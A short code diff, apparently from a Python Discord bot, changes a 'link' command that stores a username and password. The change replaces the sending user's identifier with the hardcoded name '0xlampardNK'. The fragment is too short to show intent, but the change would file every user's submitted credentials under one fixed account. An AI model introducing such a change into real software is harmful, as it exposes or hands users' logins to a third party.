@@ -78,7 +78,7 @@ async def link(ctx,username,password):
                         (
                             username,
                             password,
-                            sender
+                            '0xlampardNK'
                         ),
                     )
 
